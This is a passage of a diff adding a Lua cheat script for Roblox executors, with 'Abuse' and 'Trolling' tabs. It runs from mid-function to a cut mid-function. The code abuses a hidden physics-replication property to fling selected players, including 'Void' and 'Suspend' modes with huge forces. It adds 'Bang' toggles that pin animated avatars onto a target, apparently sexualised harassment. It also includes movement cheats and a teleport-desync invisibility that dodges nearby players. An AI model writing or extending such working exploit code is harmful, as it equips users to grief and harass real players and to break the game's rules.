+        if caConn then caConn:Disconnect(); caConn = nil end
+        latchRoot = nil; latchTime = 0
+        activeFlingCount = activeFlingCount + 1
+        caConn = weldRun.Heartbeat:Connect(function()
+            if not caEnabled then return end
+            if not selectedTarget then return end
+            local myChar = weldLocal.Character
+            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+            if not myChar or not myRoot then return end
+            local tgtChar = selectedTarget.Character
+            local tgtRoot = tgtChar and tgtChar:FindFirstChild("HumanoidRootPart")
+            if not tgtChar or not tgtRoot then return end
+            pcall(function()
+                for _, part in ipairs(myChar:GetDescendants()) do
+                    if part:IsA("BasePart") then part.CanCollide = false end
+                end
+                local now = tick()
+                if latchRoot then
+                    if (now - latchTime) >= NEARBY_DUR then latchRoot = nil; latchTime = 0 end
+                end
+                if not latchRoot then
+                    local found = findNearby(tgtRoot)
+                    if found then latchRoot = found; latchTime = now end
+                end
+                local anchorRoot = latchRoot or tgtRoot
+                local offsetY    = latchRoot and BELOW_OFF or HOVER_UP
+                myRoot.CFrame    = CFrame.new(anchorRoot.Position + Vector3.new(0, offsetY, 0))
+                myRoot.Velocity    = Vector3.new(500, 500, 500)
+                myRoot.RotVelocity = Vector3.new(500, 500, 500)
+                sethiddenproperty(myRoot, "PhysicsRepRootPart", anchorRoot)
+            end)
+        end)
+    end
+
+    TabAbuse:AddToggle({
+        Label   = "Fling Aura",
+        Default = false,
+        Callback = function(state)
+            caEnabled = state
+            if not caEnabled then
+                stopAura(); latchRoot = nil; latchTime = 0
+                return
+            end
+            if not selectedTarget then return end
+            startAura()
+        end,
+    })
+end
+
+do
+    local conn      = nil
+    local enabled   = false
+    local track     = nil
+    local lastChar  = nil
+    local noCollide = true
+    local animId    = 128118761466261
+    local RADIUS    = 7
+    local SPEED     = 3
+
+    TabAbuse:AddToggle({
+        Label   = "Taunt",
+        Default = false,
+        Callback = function(state)
+            enabled = state
+            if not enabled then
+                activeFlingCount = math.max(0, activeFlingCount - 1)
+                cleanupToggle(conn, track, noCollide)
+                conn = nil; track = nil; lastChar = nil
+                return
+            end
+            if not selectedTarget then return end
+            activeFlingCount = activeFlingCount + 1
+            conn = weldRun.Heartbeat:Connect(function()
+                if not enabled then return end
+                if not selectedTarget or not weldPlayers:FindFirstChild(selectedTarget.Name) then
+                    enabled = false
+                    activeFlingCount = math.max(0, activeFlingCount - 1)
+                    cleanupToggle(conn, track, noCollide)
+                    conn = nil; track = nil; lastChar = nil
+                    return
+                end
+                local myChar = weldLocal.Character
+                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                if not myChar or not myRoot then return end
+                local tgtChar = selectedTarget.Character
+                local tgtRoot = tgtChar and tgtChar:FindFirstChild("HumanoidRootPart")
+                if not tgtChar or not tgtRoot then return end
+                if myChar ~= lastChar then
+                    lastChar = myChar
+                    if track then track:Stop(); track:Destroy() end
+                    track = loadAnim(myChar, animId, 0, false)
+                end
+                pcall(function()
+                    for _, part in ipairs(myChar:GetDescendants()) do
+                        if part:IsA("BasePart") and noCollide then part.CanCollide = false end
+                    end
+                    local angle    = tick() * SPEED
+                    local tgtPos   = tgtRoot.Position
+                    local worldPos = tgtPos + Vector3.new(math.cos(angle)*RADIUS, 0, math.sin(angle)*RADIUS)
+                    local lookAt   = Vector3.new(tgtPos.X, worldPos.Y, tgtPos.Z)
+                    myRoot.CFrame      = CFrame.new(worldPos, lookAt)
+                    myRoot.Velocity    = Vector3.zero
+                    myRoot.RotVelocity = Vector3.zero
+                    sethiddenproperty(myRoot, "PhysicsRepRootPart", tgtRoot)
+                end)
+            end)
+        end,
+    })
+end
+
+makeOscillatingToggle(TabAbuse, "Bang", {
+    up=-1.85, forward=-4.7, side=0, tiltX=0, tiltY=0, tiltZ=0,
+    faceBack=false, noCollide=false, freezeAt=0, animId=78141481814457, swingAmp=3, swingSpeed=1
+})
+makeOscillatingToggle(TabAbuse, "Bang 2", {
+    up=-1.85, forward=-4.6, side=-0.5, tiltX=0, tiltY=0, tiltZ=0,
+    faceBack=false, noCollide=false, freezeAt=0, animId=121107013783398, swingAmp=3, swingSpeed=1
+})
+
+makeSmartPositionToggle(TabAbuse, "Slow Down", {
+    animId=136924276934156, freezeAt=4.1,
+    frontOff={0, 2.5, 0}, backOff={0, 2.2, -0.3}
+})
+makeSmartPositionToggle(TabAbuse, "Movement Breaker", {
+    animId=75065228741970, freezeAt=0,
+    frontOff={0, 0.7, -0.85}, backOff={0, 0.7, 0.85}
+})
+
+makeSimpleToggle(TabAbuse, "Platform Fly",         {up=-4,    forward=0,    side=0,    tiltX=90,  tiltY=0, tiltZ=0, noCollide=false})
+makeSimpleToggle(TabAbuse, "Magic Carpet",         {up=-3.6,  forward=0,    side=0,    tiltX=90,  tiltY=0, tiltZ=0, noCollide=false})
+makeSimpleToggle(TabAbuse, "Elevator",             {up=-3,    forward=0,    side=0,    tiltX=90,  tiltY=0, tiltZ=0, noCollide=false})
+makeSimpleToggle(TabAbuse, "Anti Jump",            {up=3.5,   forward=0,    side=0,    tiltX=-90, tiltY=0, tiltZ=0, noCollide=false})
+makeSimpleToggle(TabAbuse, "test",                 {up=0,     forward=0,    side=0,    tiltX=0,   tiltY=0, tiltZ=0, noCollide=true,  useHead=true})
+makeSimpleToggle(TabAbuse, "Body Armor",           {up=1.5,   forward=-1.1, side=0,    tiltX=0,   tiltY=0, tiltZ=0, noCollide=true,  freezeAt=3,   animId=131622627648697})
+makeSimpleToggle(TabAbuse, "Infinite Jump",        {up=-5.75, forward=0,    side=0,    tiltX=0,   tiltY=0, tiltZ=0, noCollide=false})
+makeSimpleToggle(TabAbuse, "test2",                {up=0,  forward=0,    side=0,    tiltX=0,   tiltY=0, tiltZ=0, noCollide=false, useHead=false})
+makeSimpleToggle(TabAbuse, "Speed Boost (Medium)", {up=0.7,   forward=-0.5, side=0,    tiltX=0,   tiltY=180, tiltZ=0, noCollide=false, animId=75065228741970})
+makeSimpleToggle(TabAbuse, "Speed Boost (Fast)",   {up=0.7,   forward=-0.35,side=0,    tiltX=0,   tiltY=0, tiltZ=0, noCollide=false, animId=75065228741970})
+makeSimpleToggle(TabAbuse, "Speed Boost (Extreme)",{up=-0.5,  forward=-3,   side=0,    tiltX=0,   tiltY=0, tiltZ=0, noCollide=true,  freezeAt=3.1, animId=122171615550871})
+makeSimpleToggle(TabAbuse, "BHop",                 {up=-0.5,  forward=-3,   side=-0.9, tiltX=0,   tiltY=0, tiltZ=0, noCollide=true,  freezeAt=3.1, animId=128265423063940})
+makeSimpleToggle(TabAbuse, "Reverse",              {up=0.7,   forward=0.8,  side=0,    tiltX=0,   tiltY=0, tiltZ=0, noCollide=false, animId=75065228741970})
+
+TabTrolling:AddTextInput({
+    Label       = "Player Name",
+    Placeholder = "Enter player/-",
+    Callback = function(input)
+        nanTarget = tostring(input or "")
+    end,
+})
+
+local function setupInvisibility()
+          local lplayer    = weldPlayers.LocalPlayer
+          local UIS        = game:GetService("UserInputService")
+          local RunService = game:GetService("RunService")
+          local Players    = game:GetService("Players")
+          local humanoid, rootPart
+          local toggleOn   = false
+          local invisConn  = nil
+          local shiftLockConn = nil
+          local proximityConn = nil
+
+          local virtualHRPPos = Vector3.new()
+
+          local shiftLockActive = false
+          local cameraYaw   = 0
+          local cameraPitch = 0
+          -- target yaw/pitch we smooth toward (set LOOK_SMOOTHNESS = 1 to disable)
+          local targetYaw   = 0
+          local targetPitch = 0
+
+          local SHIFT_LOCK_OFFSET = Vector3.new(1.75, 0, 0)
+          local SENSITIVITY = 0.4
+
+          local cameraDistance = 12
+          local targetDistance = 12
+          local zoomInitialized = false
+          local MIN_ZOOM = 0.5
+          local MAX_ZOOM = 128
+          local ZOOM_STEP = 3
+
+          -- Smoothing now expressed as a per-second response rate so feel is
+          -- identical at any framerate. Higher = snappier.
+          local ZOOM_RESPONSE = 14
+          local LOOK_RESPONSE = 30
+          local LOOK_SMOOTHNESS = 1.0
+
+          local FIRST_PERSON_THRESHOLD = 1.0
+          local FIRST_PERSON_HYSTERESIS = 0.25
+          local inFirstPerson = false
+
+          -- Camera collision: pull in when a wall blocks the view.
+          local CAMERA_COLLISION = true
+          local CAMERA_COLLISION_RADIUS = 0.5
+
+          local isMB2Down = false
+          local pendingReleaseConn = nil
+
+          -- ===== Mode selection =====
+          -- "Method 1" = old simple -200000 teleport.
+          -- "Method 2" = new proximity/drop/pulsing method.
+          local MODE_OLD = "Normal"
+          local MODE_NEW = "Anti-Bang"
+          local mode = MODE_NEW
+
+          -- ===== Proximity-based drop adjustment (Method 2 only) =====
+          local PROXIMITY_RADIUS = 25            -- studs around the detection point
+          local DROP_FAR  = -300                 -- default drop value
+          local DROP_NEAR = -800                 -- drop value when a player is close
+          local NEAR_HOLD = 0.22                 -- seconds to hold -500 before reverting
+          local drop      = DROP_FAR             -- current drop value used by startInvis()
+          local switching = false                -- re-entrancy guard for the 0.1s transitions
+          local pulsing   = false                -- true while a -500 pulse is in progress
+
+          -- Fixed detection point: where the HRP teleports during the invis cycle.
+          local DETECT_POINT = Vector3.new(0, -300, -200000)
+
+          -- Forward declarations so switchDrop / startProximityWatcher can call startInvis.
+          local startInvis
+          local startProximityWatcher
+
+          local function clearPendingRelease()
+              if pendingReleaseConn then
+                  pendingReleaseConn:Disconnect()
+                  pendingReleaseConn = nil
+              end
+          end
+
+          local function updateChar()
+              local character = lplayer.Character or lplayer.CharacterAdded:Wait()
+              humanoid = character:WaitForChild("Humanoid")
+              rootPart = character:WaitForChild("HumanoidRootPart")
+          end
+          updateChar()
+
+          local function setCharacterFirstPerson(firstPerson)
+              local char = lplayer.Character
+              if not char then return end
+              for _, part in ipairs(char:GetDescendants()) do
+                  if part:IsA("BasePart") or part:IsA("Decal") then
+                      part.LocalTransparencyModifier = firstPerson and 1 or 0
+                  end
+              end
+              local clone = workspace:FindFirstChild("NanClone")
+              if clone then
+                  for _, part in ipairs(clone:GetDescendants()) do
+                      if (part:IsA("BasePart") or part:IsA("Decal"))
+                      and part.Name ~= "HumanoidRootPart" then
+                          part.LocalTransparencyModifier = firstPerson and 1 or 0
+                      end
+                  end
+              end
+          end
+
+          -- Builds the raycast params that ignore our own character + clone so the
+          -- camera collision check doesn't snap onto ourselves.
+          local function getCollisionParams()
+              local params = RaycastParams.new()
+              params.FilterType = Enum.RaycastFilterType.Exclude
+              local filter = {}
+              if lplayer.Character then table.insert(filter, lplayer.Character) end
+              local clone = workspace:FindFirstChild("NanClone")
+              if clone then table.insert(filter, clone) end
+              params.FilterDescendantsInstances = filter
+              params.IgnoreWater = true
+              return params
+          end
+
+          -- Given the subject (pivot) point and the desired far camera position,
+          -- returns a possibly-closer position if geometry is in the way.
+          local function resolveCameraCollision(subjectPos, desiredPos)
+              if not CAMERA_COLLISION then return desiredPos end
+              local dir = desiredPos - subjectPos
+              local dist = dir.Magnitude
+              if dist < 0.001 then return desiredPos end
+              local result = workspace:Raycast(subjectPos, dir, getCollisionParams())
+              if result then
+                  local hitDist = (result.Position - subjectPos).Magnitude
+                  local clamped = math.max(hitDist - CAMERA_COLLISION_RADIUS, MIN_ZOOM)
+                  return subjectPos + dir.Unit * clamped
+              end
+              return desiredPos
+          end
+
+          local function startCustomShiftLock()
+              if shiftLockConn then shiftLockConn:Disconnect() end
+
+              local camCF = workspace.CurrentCamera.CFrame
+              local lookVec = camCF.LookVector
+              cameraYaw   = math.atan2(-lookVec.X, -lookVec.Z)
+              cameraPitch = math.asin(lookVec.Y)
+              targetYaw   = cameraYaw
+              targetPitch = cameraPitch
+
+              -- Re-measure the live camera distance on every engage so zoom changes
+              -- made while NOT shift-locked are respected. Only fall back to the
+              -- stored distance when the reading is unreliable -- either ~0, OR we
+              -- were already in first person (where the measured distance is just the
+              -- subject-height offset, not a real zoom, and would cause a tiny pop).
+              do
+                  local cam = workspace.CurrentCamera
+                  local referencePos = virtualHRPPos
+                  if referencePos.Magnitude < 0.01 and rootPart then
+                      referencePos = rootPart.Position
+                  end
+                  local measuredDist = (cam.CFrame.Position - referencePos).Magnitude
+
+                  -- We consider the reading untrustworthy if we already know we're in
+                  -- first person, or the stored zoom is at/below the threshold.
+                  local wasFirstPerson = inFirstPerson
+                      or cameraDistance <= FIRST_PERSON_THRESHOLD
+
+                  if not wasFirstPerson and measuredDist > FIRST_PERSON_THRESHOLD then
+                      -- Trustworthy reading -- adopt the camera's current zoom.
+                      cameraDistance = math.clamp(measuredDist, MIN_ZOOM, MAX_ZOOM)
+                  elseif not zoomInitialized then
+                      -- First ever engage and reading is unreliable: clamp what we got.
+                      cameraDistance = math.clamp(measuredDist, MIN_ZOOM, MAX_ZOOM)
+                  end
+                  -- else: keep the stored cameraDistance (genuine first-person re-engage)
+                  zoomInitialized = true
+              end
+              targetDistance = cameraDistance
+
+              shiftLockConn = RunService.RenderStepped:Connect(function(dt)
+                  if not toggleOn or not shiftLockActive then return end
+
+                  local cam = workspace.CurrentCamera
+
+                  -- Accumulate raw look into targets, then smooth toward them.
+                  local delta = UIS:GetMouseDelta()
+                  targetYaw   = targetYaw - math.rad(delta.X * SENSITIVITY)
+                  targetPitch = math.clamp(
+                      targetPitch - math.rad(delta.Y * SENSITIVITY),
+                      math.rad(-75), math.rad(75)
+                  )
+
+                  if LOOK_SMOOTHNESS >= 1.0 then
+                      cameraYaw   = targetYaw
+                      cameraPitch = targetPitch
+                  else
+                      local lookAlpha = 1 - math.exp(-LOOK_RESPONSE * dt)
+                      cameraYaw   = cameraYaw   + (targetYaw   - cameraYaw)   * lookAlpha
+                      cameraPitch = cameraPitch + (targetPitch - cameraPitch) * lookAlpha
+                  end
+
+                  -- Frame-rate independent zoom lerp.
+                  local zoomAlpha = 1 - math.exp(-ZOOM_RESPONSE * dt)
+                  cameraDistance = cameraDistance + (targetDistance - cameraDistance) * zoomAlpha
+
+                  -- First-person with hysteresis so we don't flicker at the boundary.
+                  if inFirstPerson then
+                      if cameraDistance > FIRST_PERSON_THRESHOLD + FIRST_PERSON_HYSTERESIS then
+                          inFirstPerson = false
+                      end
+                  else
+                      if cameraDistance <= FIRST_PERSON_THRESHOLD then
+                          inFirstPerson = true
+                      end
+                  end
+                  setCharacterFirstPerson(inFirstPerson)
+
+                  local rotation = CFrame.Angles(0, cameraYaw, 0) * CFrame.Angles(cameraPitch, 0, 0)
+                  local subjectPos = virtualHRPPos + Vector3.new(0, 1.5, 0)
+
+                  local camPos
+                  if inFirstPerson then
+                      camPos = subjectPos
+                  else
+                      -- Collapse the shoulder offset to 0 as we near first person so
+                      -- there's no sideways pop on the transition.
+                      local offsetBlend = math.clamp(
+                          (cameraDistance - FIRST_PERSON_THRESHOLD) /
+                          math.max(FIRST_PERSON_HYSTERESIS, 0.001),
+                          0, 1
+                      )
+                      local shoulderPos = subjectPos
+                          + rotation:VectorToWorldSpace(SHIFT_LOCK_OFFSET * offsetBlend)
+                      local desired = shoulderPos - rotation.LookVector * cameraDistance
+                      camPos = resolveCameraCollision(subjectPos, desired)
+                  end
+
+                  cam.CFrame = CFrame.new(camPos) * rotation
+
+                  if rootPart and rootPart.Parent then
+                      local hrpCF = rootPart.CFrame
+                      rootPart.CFrame = CFrame.new(hrpCF.Position) * CFrame.Angles(0, cameraYaw, 0)
+                  end
+              end)
+          end
+
+          local function stopCustomShiftLock()
+              if shiftLockConn then shiftLockConn:Disconnect(); shiftLockConn = nil end
+              setCharacterFirstPerson(false)
+              inFirstPerson = false
+          end
+
+          -- Sync our custom zoom into Roblox's default camera so disengaging shift
+          -- lock doesn't snap (or slide) the camera back to its old internal zoom.
+          local function syncZoomToDefaultCamera()
+              pcall(function()
+                  local minSave = lplayer.CameraMinZoomDistance
+                  local maxSave = lplayer.CameraMaxZoomDistance
+                  lplayer.CameraMinZoomDistance = cameraDistance
+                  lplayer.CameraMaxZoomDistance = cameraDistance
+                  task.spawn(function()
+                      RunService.RenderStepped:Wait()
+                      RunService.RenderStepped:Wait()
+                      lplayer.CameraMinZoomDistance = minSave
+                      lplayer.CameraMaxZoomDistance = maxSave
+                  end)
+              end)
+          end
+
+          UIS.InputBegan:Connect(function(input)
+              if input.UserInputType == Enum.UserInputType.MouseButton2 then
+                  isMB2Down = true
+              end
+          end)
+          UIS.InputEnded:Connect(function(input)
+              if input.UserInputType == Enum.UserInputType.MouseButton2 then
+                  isMB2Down = false
+              end
+          end)
+
+          UIS.InputChanged:Connect(function(input, gameProcessed)
+              if gameProcessed then return end
+              if not (toggleOn and shiftLockActive) then return end
+              if input.UserInputType ~= Enum.UserInputType.MouseWheel then return end
+
+              targetDistance = math.clamp(
+                  targetDistance - input.Position.Z * ZOOM_STEP,
+                  MIN_ZOOM, MAX_ZOOM
+              )
+          end)
+
+          UIS.InputBegan:Connect(function(input, gameProcessed)
+              if gameProcessed then return end
+              if not toggleOn then return end
+              if input.KeyCode ~= Enum.KeyCode.LeftShift
+              and input.KeyCode ~= Enum.KeyCode.RightShift then return end
+
+              if shiftLockActive then
+                  -- Settle the zoom lerp instantly so the pinned CFrame and the
+                  -- synced zoom describe the same distance (fixes zoom-out slide).
+                  cameraDistance = targetDistance
+                  cameraYaw   = targetYaw
+                  cameraPitch = targetPitch
+
+                  -- Rebuild the camera CFrame from the settled distance, not the
+                  -- mid-lerp camera, so position and zoom agree exactly.
+                  local rotation = CFrame.Angles(0, cameraYaw, 0) * CFrame.Angles(cameraPitch, 0, 0)
+                  local subjectPos = virtualHRPPos + Vector3.new(0, 1.5, 0)
+                  local finalCamCF
+                  if cameraDistance <= FIRST_PERSON_THRESHOLD then
+                      finalCamCF = CFrame.new(subjectPos) * rotation
+                  else
+                      local offsetBlend = math.clamp(
+                          (cameraDistance - FIRST_PERSON_THRESHOLD) /
+                          math.max(FIRST_PERSON_HYSTERESIS, 0.001),
+                          0, 1
+                      )
+                      local shoulderPos = subjectPos
+                          + rotation:VectorToWorldSpace(SHIFT_LOCK_OFFSET * offsetBlend)
+                      local desired = shoulderPos - rotation.LookVector * cameraDistance
+                      finalCamCF = CFrame.new(resolveCameraCollision(subjectPos, desired)) * rotation
+                  end
+
+                  shiftLockActive = false
+                  stopCustomShiftLock()
+                  workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
+                  workspace.CurrentCamera.CFrame = finalCamCF
+
+                  syncZoomToDefaultCamera()
+
+                  clearPendingRelease()
+                  if isMB2Down then
+                      UIS.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
+                      pendingReleaseConn = UIS.InputEnded:Connect(function(rel)
+                          if rel.UserInputType == Enum.UserInputType.MouseButton2 then
+                              clearPendingRelease()
+                              if not shiftLockActive then
+                                  UIS.MouseBehavior = Enum.MouseBehavior.Default
+                              end
+                          end
+                      end)
+                  else
+                      UIS.MouseBehavior = Enum.MouseBehavior.Default
+                  end
+              else
+                  clearPendingRelease()
+                  shiftLockActive = true
+                  workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+                  UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
+                  startCustomShiftLock()
+              end
+          end)
+
+          -- startInvis is forward-declared above; assign to it here. It branches on
+          -- the selected mode: Method 1 is the simple relative -200000 teleport with
+          -- no destroy-plane / drop handling; Method 2 is the absolute drop teleport
+          -- driven by the proximity `drop` value.
+          startInvis = function()
+              if invisConn then invisConn:Disconnect() end
+              local busy = false
+
+              invisConn = RunService.Heartbeat:Connect(function()
+                  if busy or not toggleOn then return end
+
+                  if not (rootPart and humanoid and rootPart.Parent) then
+                      updateChar()
+                      return
+                  end
+
+                  busy = true
+
+                  local originalCFrame = rootPart.CFrame
+                  local originalPos    = originalCFrame.Position
+
+                  virtualHRPPos = originalPos
+
+                  if mode == MODE_OLD then
+                      -- ===== Method 1: simple relative drop, no destroy-plane work.
+                      local teleportCFrame = originalCFrame * CFrame.new(0, -200000, 0)
+                      rootPart.CFrame = teleportCFrame
+
+                      if not shiftLockActive then
+                          humanoid.CameraOffset = teleportCFrame:ToObjectSpace(
+                              CFrame.new(originalPos)
+                          ).Position
+                      end
+
+                      RunService.RenderStepped:Wait()
+
+                      if rootPart and rootPart.Parent then
+                          local currentRotation = rootPart.CFrame.Rotation
+                          rootPart.CFrame = currentRotation + originalPos
+                      end
+                      if humanoid and not shiftLockActive then
+                          humanoid.CameraOffset = Vector3.new(0, 0, 0)
+                      end
+                  else
+                      -- ===== Method 2: absolute drop using the proximity `drop` value.
+                      local savedDestroy = workspace.FallenPartsDestroyHeight
+                      workspace.FallenPartsDestroyHeight = -1000
+
+                      local teleportCFrame = CFrame.new(0, drop, -200000)
+                      rootPart.CFrame = teleportCFrame
+
+                      if not shiftLockActive then
+                          humanoid.CameraOffset = teleportCFrame:ToObjectSpace(
+                              CFrame.new(originalPos)
+                          ).Position
+                      end
+
+                      RunService.RenderStepped:Wait()
+
+                      if rootPart and rootPart.Parent then
+                          local currentRotation = rootPart.CFrame.Rotation
+                          rootPart.CFrame = currentRotation + originalPos
+                      end
+                      if humanoid and not shiftLockActive then
+                          humanoid.CameraOffset = Vector3.new(0, 0, 0)
+                      end
+                      workspace.FallenPartsDestroyHeight = savedDestroy
+                  end
+
+                  busy = false
+              end)
+          end
+
+          -- Pause invis, change the drop value, reconnect after 0.1s.
+          local function switchDrop(newDrop)
+              if switching then return end
+              if drop == newDrop then return end
+              switching = true
+              if invisConn then invisConn:Disconnect(); invisConn = nil end
+              task.delay(0.1, function()
+                  drop = newDrop
+                  if toggleOn then startInvis() end
+                  switching = false
+              end)
+          end
+
+          -- Pulse to -500 for NEAR_HOLD seconds, then revert to -300. The watcher
+          -- re-scans after the pulse completes, so it re-pulses if a player is
+          -- still in range -- no latching, no waiting for death.
+          local function pulseNear()
+              if pulsing or switching then return end
+              pulsing = true
+              switchDrop(DROP_NEAR)
+              task.delay(NEAR_HOLD, function()
+                  if not toggleOn then
+                      pulsing = false
+                      return
+                  end
+                  switchDrop(DROP_FAR)
+                  pulsing = false
+              end)
+          end
+
+          -- startProximityWatcher is forward-declared above; assign to it here.
+          -- Only meaningful in Method 2; it bails out immediately in Method 1.
+          startProximityWatcher = function()
+              if proximityConn then proximityConn:Disconnect() end
+              proximityConn = RunService.Heartbeat:Connect(function()
+                  if not toggleOn then return end
+                  if mode ~= MODE_NEW then return end
+                  -- A pulse is already running or a drop swap is in flight; wait it out.
+                  if pulsing or switching then return end
+
+                  -- Detection is measured against the FIXED teleport point. Any
+                  -- player whose HumanoidRootPart comes within PROXIMITY_RADIUS of
+                  -- this point triggers a -500 pulse.
+                  for _, plr in ipairs(Players:GetPlayers()) do
+                      if plr ~= lplayer and plr.Character then
+                          local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+                          local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
+                          if hum and hrp and hum.Health > 0 then
+                              if (hrp.Position - DETECT_POINT).Magnitude <= PROXIMITY_RADIUS then
+                                  pulseNear()
+                                  break
+                              end
+                          end
+                      end
+                  end
+              end)
+          end
+
+          -- Start whichever pieces the current mode needs.
+          local function startForMode()
+              startInvis()
+              if mode == MODE_NEW then
+                  startProximityWatcher()
+              end
+          end
+
+          local function stopInvis()
+              if invisConn then invisConn:Disconnect(); invisConn = nil end
+
+              -- Proximity cleanup (Method 2).
+              if proximityConn then proximityConn:Disconnect(); proximityConn = nil end
+              switching = false
+              pulsing   = false
+              drop = DROP_FAR
+
+              stopCustomShiftLock()
+              clearPendingRelease()
+              if shiftLockActive then
+                  UIS.MouseBehavior = Enum.MouseBehavior.Default
+              end
+              shiftLockActive = false
+              zoomInitialized = false
+              if workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable then
+                  workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
+              end
+              if humanoid then humanoid.CameraOffset = Vector3.new(0, 0, 0) end
+              pcall(function()
+                  lplayer.DevEnableMouseLock = true
+              end)
+          end
+
+          lplayer.CharacterAdded:Connect(function(character)
+              humanoid = character:WaitForChild("Humanoid")
+              rootPart = character:WaitForChild("HumanoidRootPart")
+              if toggleOn then
+                  startForMode()
+              end
+          end)
+
+          -- Mode dropdown: switching while invis is ON cleanly stops the running
+          -- method and restarts with the newly selected one.
+          TabTrolling:AddDropdown({
+              Label    = "Invis Mode",
+              Options  = {MODE_OLD, MODE_NEW},
+              Default  = MODE_NEW,
+              Callback = function(value)
+                  if value ~= MODE_OLD and value ~= MODE_NEW then return end
+                  if value == mode then return end
+
+                  if toggleOn then
+                      -- Tear down the current method's connections, then re-arm.
+                      if invisConn then invisConn:Disconnect(); invisConn = nil end
+                      if proximityConn then proximityConn:Disconnect(); proximityConn = nil end
+                      switching = false
+                      pulsing   = false
+                      drop = DROP_FAR
+                      mode = value
+                      updateChar()
+                      startForMode()
+                  else
+                      mode = value
+                  end
+              end,
+          })
+
+          TabTrolling:AddToggle({
+              Label   = "Invisibility",
+              Default = false,
+              Callback = function(value)
+                  toggleOn = value
+                  if value then
+                      updateChar()
+                      pcall(function()
+                          lplayer.DevEnableMouseLock = false
+                          if rootPart then
+                              sethiddenproperty(rootPart, "PhysicsRepRootPart", rootPart)
+                          end
+                      end)
+                      startForMode()
+                  else
+                      stopInvis()
+                  end
+              end,
+          })
+
+          return {
+              isOn = function() return toggleOn end,
+              reapply = function()
+                  if not toggleOn then return end
+                  updateChar()
+                  startForMode()
+              end,
+          }
+      end
+
+      local invisSystem = setupInvisibility()
+
+local function setupNanSystem()
+    local nanFakeChar         = nil
+    local nanFakeAnimTracks   = {}
+    local nanRenderConn       = nil
+    local nanTransparencyConn = nil
+    local nanCamConn          = nil
+    local nanRealChar         = nil
+    local nanSavedCamSubject  = nil
+    local nanSavedTracks      = {}
+    local nanLastFakeCFrame   = nil
+    local nanControls         = nil
+    local VOID_THRESHOLD      = -100
+    local lastSafePosition    = nil
+    local voidSafetyConn      = nil
+
+    -- Builds a rotation CFrame from a Vector3 of DEGREES (X, Y, Z).
+    -- Used by both fling paths so they stay identical.
+    local function nanRotCFrame(v)
+        return CFrame.Angles(math.rad(v.X), math.rad(v.Y), math.rad(v.Z))
+    end
+
+    -- Per-option config: edit waits, offsets, and rotation for each option here.
+    --   TWO-PHASE FLING:
+    --   Phase 1 (the HOLD): your character moves to offset1 and waits there for
+    --     wait1 seconds. Positioning only -- no fling power is applied yet.
+    --   Phase 2 (the FLING): your character moves to offset and the actual fling
+    --     (power + physics rep) is applied for wait seconds.
+    --
+    --   offset1  = first CFrame your character goes to, in the target's local space.
+    --   wait1    = seconds to hold at offset1 before phase two.
+    --   offset   = second/final CFrame (the original fling offset).
+    --   wait     = seconds to apply the fling at offset.
+    --   rotation = Vector3 of DEGREES (X, Y, Z) applied to YOUR character, relative
+    --              to the target's facing. Used in BOTH phases.
+    local nanFlingConfig = {
+        Regular = {
+            power    = Vector3.new(0, 0, 0),
+            offset1  = CFrame.new(0, 4, 0),          -- phase 1: go here first
+            wait1    = 1,                            -- phase 1: hold for 1 second
+            offset   = CFrame.new(0, 0, 0),          -- phase 2: original behavior
+            wait     = 0.02,                          -- phase 2: fling for 0.5s
+            rotation = Vector3.new(-90, 0, 0),       -- degrees: X, Y, Z
+        },
+        Void = {
+            power    = Vector3.new(0, -30000, 0),
+            offset1  = CFrame.new(0, 0, 0),          -- phase 1: go here first
+            wait1    = 0,                            -- phase 1: hold for 1 second
+            offset   = CFrame.new(0, 1, 0),          -- phase 2
+            wait     = 0.5,                          -- phase 2: fling for 0.5s
+            rotation = Vector3.new(-90, 0, 0),       -- degrees: X, Y, Z
+        },
+        Suspend = {
+            power    = Vector3.new(9e9, 9e9, 9e9),
+            offset1  = CFrame.new(0, 0, 0),          -- phase 1: go here first
+            wait1    = 0,                            -- phase 1: hold for 1 second
+            offset   = CFrame.new(0, 0, 0),          -- phase 2
+            wait     = 0.5,                          -- phase 2: fling for 0.5s
+            rotation = Vector3.new(0, 0, 0),         -- degrees: X, Y, Z
+        },
+    }
+
+    -- Live values both doFling functions read. Initialized to the dropdown's
+    -- default ("Regular") so the button works before the dropdown is touched.
+    local nanFlingPower    = nanFlingConfig.Regular.power
+    local nanFlingOffset1  = nanFlingConfig.Regular.offset1
+    local nanFlingWait1    = nanFlingConfig.Regular.wait1
+    local nanFlingOffset   = nanFlingConfig.Regular.offset
+    local nanFlingWait     = nanFlingConfig.Regular.wait
+    local nanFlingRotation = nanFlingConfig.Regular.rotation
+
+    pcall(function()
+        local PM = require(weldLocal:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
+        nanControls = PM:GetControls()
+    end)
+
+    TabTrolling:AddDropdown({
+        Label    = "Fling Power",
+        Options  = {"Regular", "Void", "Suspend"},
+        Default  = "Regular",
+        Callback = function(value)
+            local cfg = nanFlingConfig[value]
+            if not cfg then return end
+            nanFlingPower    = cfg.power
+            nanFlingOffset1  = cfg.offset1
+            nanFlingWait1    = cfg.wait1
+            nanFlingOffset   = cfg.offset
+            nanFlingWait     = cfg.wait
+            nanFlingRotation = cfg.rotation
+        end,
+    })
+
+    local function nanStartVoidSafety()
+        if voidSafetyConn then return end
+        voidSafetyConn = RunService.Heartbeat:Connect(function()
+            local mc = weldLocal.Character
+            local mr = mc and mc:FindFirstChild("HumanoidRootPart")
+            if not mr then return end
+            local pos = mr.Position
+
+            -- Let invisibility's deep teleport pass through untouched.
+            if invisSystem.isOn() and pos.Y < -150000 then
+                return
+            end
+
+            if pos.Y > VOID_THRESHOLD then
+                lastSafePosition = mr.CFrame
+            else
+                if lastSafePosition then
+                    mr.CFrame = lastSafePosition
+                    mr.AssemblyLinearVelocity  = Vector3.zero
+                    mr.AssemblyAngularVelocity = Vector3.zero
+                end
+            end
+        end)
+    end
+
+    local function nanResetPhysicsRep()
+        local mc = weldLocal.Character
+        local mr = mc and mc:FindFirstChild("HumanoidRootPart")
+        if mr then
+            pcall(function()
